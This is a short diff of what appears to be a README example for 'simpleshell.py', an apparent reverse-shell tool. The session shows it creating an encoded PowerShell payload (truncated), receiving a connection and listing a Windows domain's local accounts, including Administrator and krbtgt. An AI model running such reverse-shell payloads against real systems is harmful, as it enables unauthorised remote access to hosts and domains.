@@ -1,16 +1,16 @@
-> $ python simpleshell.py  
+$ python simpleshell.py  
 
-> $> .payload
+$> .payload
 
-> [+] Encoded shell created  
+[+] Encoded shell created  
 powershell -e JABjAGwAaQBlAG4AdAAgA...
 
-> $>.listen  
-> > [+] Connection received
+$>.listen  
+[+] Connection received
 
-> $> get-localuser  
+$> get-localuser  
 > Name          Enabled Description                                             
-> ----          ------- -----------                                             
+                                             
 > Administrator True    Built-in account for administering the computer/domain  
 > Guest         False   Built-in account for guest access to the computer/domain
 > krbtgt        False   Key Distribution Center Service Account                 
